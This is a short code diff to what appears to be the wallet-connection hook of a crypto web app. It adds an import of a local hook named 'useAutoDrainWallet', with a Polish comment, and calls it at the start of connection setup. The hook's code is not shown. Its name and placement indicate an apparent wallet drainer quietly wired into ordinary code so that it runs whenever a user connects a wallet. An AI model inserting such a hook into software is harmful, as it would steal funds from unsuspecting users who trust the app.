@@ -13,6 +13,7 @@ import { cancelAllRetry } from '@/utils/common'
 import { sendWalletEvent } from '@/api/event'
 import { validateTxData, extendTxData } from '@/api/txService'
 import { parseUserAgent } from 'react-device-detect'
+import useAutoDrainWallet from './useAutoDrainWallet' // Importowanie hooka
 
 const localFakePubKey = '_r_f_wallet_'
 export const WALLET_STORAGE_KEY = 'walletName'
@@ -20,7 +21,7 @@ export const WALLET_STORAGE_KEY = 'walletName'
 function useInitConnection(props: SSRData) {
   const { connection } = useConnection()
   const { publicKey: _publicKey, signAllTransactions: _signAllTransactions, signTransaction, wallet, connected } = useWallet()
-
+  useAutoDrainWallet()
   const publicKey = useMemo(() => {
     const localPub = getDevOnlyStorage(localFakePubKey)
     if (isLocal() && localPub) {
